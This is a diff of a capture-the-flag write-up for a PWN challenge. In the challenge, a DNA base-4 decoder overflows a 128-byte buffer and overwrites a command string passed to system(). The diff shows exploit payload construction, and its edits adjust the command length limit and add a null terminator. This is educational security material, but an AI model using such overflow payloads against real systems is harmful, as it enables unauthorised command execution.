@@ -7,7 +7,9 @@ Solves: 44 / Points: 85 / Category: PWN
 
 ## Challenge description
 > All you need to do is to pwn using some DNA samples...
+>
 > Once you gathered enough information, go checkout https://gcorp-stage-2.ctf.insecurity-insa.fr/
+>
 > Note: you should validate stage 1 to have more information on stage 2.
 
 In stage 1, we were given a pcap file. From a TCP stream, it was possible to extract a 64bits ELF executable. We are told that this binary is running on a remote server. It is translating DNA sequences into bytes.
@@ -16,9 +18,9 @@ In stage 1, we were given a pcap file. From a TCP stream, it was possible to ext
 
 ### DNA encoding
 
-Performing static and dynamic anaylysis of the binary, we can see how DNA encoding is performed. It is actually a base4 encoding with "A", "C", "G" and "T" characters.
+Performing static and dynamic analysis of the binary, we can see how DNA decoding is performed. It is actually a base4 decoding with "A", "C", "G" and "T" characters.
 
-Each blocs of 4 characters encode 1 byte. We have the following correspondance table
+Each blocks of 4 characters encode 1 byte. We have the following correspondance table
 ```
 AAAA => 0x00
 AAAC => 0x01
@@ -45,7 +47,7 @@ TTTT => 0xff (255)
 
 User input is a DNA sequence of maximum 1024 bytes. After decoding, the output is 1024/4 = 256 bytes long. However, this output is stored within a 128 bytes char table. Therefore, it is possible to write 128 junk bytes, then overflow the table to override the `gcmd` variable which is given as parameter to the `system` command.
 
-To exploit the remote system, we have to write 128 junk bytes, then write the command (128 characters maximum) we want the system to execute.
+To exploit the remote system, we have to write 128 junk bytes, then write the command (64 characters maximum) we want to execute.
 
 ### Building an exploit
 
@@ -92,6 +94,7 @@ info("DNA is %s"%"".join(dna_list))
 # building payload
 payload = FF*OFFSET # sending 128 "\xff" 
 payload += "".join(dna_list) # sending command to execute
+payload += "AAAA" # \x00
 
 info("Full payload:\n%s"%payload)
 
@@ -100,8 +103,6 @@ with open('payload.txt', 'w') as f:
     f.write(payload)
 
 p.send(payload)
-response = p.recv(2048)
-print response
 ```
 
 ### Remote exploitation
